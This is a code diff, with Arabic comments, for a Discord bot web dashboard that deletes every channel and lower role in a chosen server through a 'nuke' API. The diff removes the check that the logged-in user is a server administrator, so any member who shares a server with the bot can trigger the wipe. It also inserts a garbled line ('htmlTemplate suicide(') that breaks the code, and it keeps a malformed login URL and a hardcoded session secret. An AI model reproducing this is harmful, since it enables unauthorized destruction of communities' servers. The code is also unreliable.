@@ -6,7 +6,6 @@ const { Client, GatewayIntentBits } = require('discord.js');
 const axios = require('axios');
 
 const app = express();
-// راندر بيعطي بورت تلقائي، وإذا مش موجود بيشتغل على 3000
 const PORT = process.env.PORT || 3000; 
 
 // 1. تشغيل بوت ديسكورد
@@ -20,7 +19,7 @@ client.once('ready', () => {
     console.log(`🤖 تم تشغيل البوت بنجاح باسم: ${client.user.tag}`);
 });
 
-// 2. إعداد الجلسات وحفظها في قاعدة بيانات المونجو (عشان راندر ما يضيع تسجيل الدخول)
+// 2. إعداد الجلسات وحفظها في قاعدة بيانات MongoDB لضمان استقرار راندر
 app.use(session({
     secret: 'render-dashboard-secure-key',
     resave: false,
@@ -62,7 +61,7 @@ app.get('/', (req, res) => {
         const loginUrl = `https://discord.com{process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.CALLBACK_URL)}&response_type=code&scope=identify%20guilds`;
         return res.send(htmlTemplate(`
             <h1>مرحباً بك في لوحة التحكم 🛠️</h1>
-            <p>سجل دخولك لتجربة تنظيف قنوات ورتب السيرفرات بلمسة واحدة.</p>
+            <p>سجل دخولك لتظهر لك السيرفرات المشتركة مع البوت وتبدأ التجربة.</p>
             <br>
             <a class="btn" href="${loginUrl}">تسجيل الدخول عبر ديسكورد</a>
         `));
@@ -96,26 +95,27 @@ app.get('/auth/callback', async (req, res) => {
         req.session.guilds = guildsResponse.data;
         res.redirect('/dashboard');
     } catch (error) {
-        res.send('حدث خطأ في الاتصال بسيرفرات ديسكورد، تأكد من صحة الـ CLIENT_SECRET و CALLBACK_URL');
+        res.send('حدث خطأ في الاتصال بسيرفرات ديسكورد، تأكد من الإعدادات ومتغيرات البيئة.');
     }
 });
 
-// عرض السيرفرات المشتركة بين البوت والمسؤول
+// عرض كل السيرفرات التي يتواجد فيها البوت وأنت متواجد فيها أيضاً
 app.get('/dashboard', (req, res) => {
     if (!req.session.user) return res.redirect('/');
 
-    // فلترة السيرفرات اللي إنت فيها أدمن (صلاحية 0x8) والبوت موجود فيها بنفس الوقت
-    const adminGuilds = req.session.guilds.filter(g => (g.permissions & 0x8) === 0x8);
-    const commonGuilds = adminGuilds.filter(g => client.guilds.cache.has(g.id));
+    // جلب السيرفرات المشتركة بين قائمة سيرفرات المستخدم وسيرفرات البوت الحالية بدون شروط إضافية
+    const commonGuilds = req.session.guilds.filter(guild => client.guilds.cache.has(guild.id));
 
     let listHtml = '<h1>اختر سيرفر التجربة ⚙️</h1>';
+    listHtml += '<p>هذه هي السيرفرات التي تجمعك مع البوت حالياً:</p><br>';
+
     if (commonGuilds.length === 0) {
-        listHtml += '<p>لم يتم العثور على سيرفرات مشتركة تمتلك فيها صلاحية مدير والبوت متواجد بها.</p>';
+        listHtml += '<p>⚠️ البوت غير موجود في أي سيرفر من سيرفراتك الحالية. قم بدعوة البوت لسيرفر التجربة أولاً.</p>';
     } else {
         commonGuilds.forEach(guild => {
             listHtml += `
                 <div class="server-card">
-                    <span><strong>${guild.name}</strong></span>
+                    <span><strong>${guild.name}</strong> (ID: ${guild.id})</span>
                     <a class="btn btn-danger" href="/manage/${guild.id}">تنظيف السيرفر</a>
                 </div>
             `;
@@ -131,7 +131,7 @@ app.get('/manage/:guildId', (req, res) => {
     const guild = client.guilds.cache.get(guildId);
     if (!guild) return res.send('البوت غير مضاف في هذا السيرفر حالياً');
 
-    res.send(htmlTemplate(`
+    res.send(htmlTemplate suicide(`
         <h1>تطهير السيرفر: ${guild.name} ⚠️</h1>
         <p>عند الضغط على الزر، سيبدأ عد تنازلي مدته 10 ثوانٍ، بعدها سيتم <strong>حذف كل القنوات والرتب الأقل من البوت</strong> بالكامل!</p>
         <br>
@@ -167,7 +167,7 @@ app.get('/manage/:guildId', (req, res) => {
     `));
 });
 
-// الـ API الفعلي المسؤول عن مسح القنوات والرتب
+// الـ API المسؤول عن مسح القنوات والرتب
 app.post('/api/nuke/:guildId', async (req, res) => {
     if (!req.session.user) return res.status(401).json({ message: 'غير مصرح لك' });
 
@@ -200,7 +200,7 @@ app.post('/api/nuke/:guildId', async (req, res) => {
     }
 });
 
-// تشغيل سيرفر الويب على راندر
+// تشغيل سيرفر الويب
 app.listen(PORT, () => {
     console.log(`🌐 لوحة التحكم تعمل وتستمع على البورت: ${PORT}`);
 });
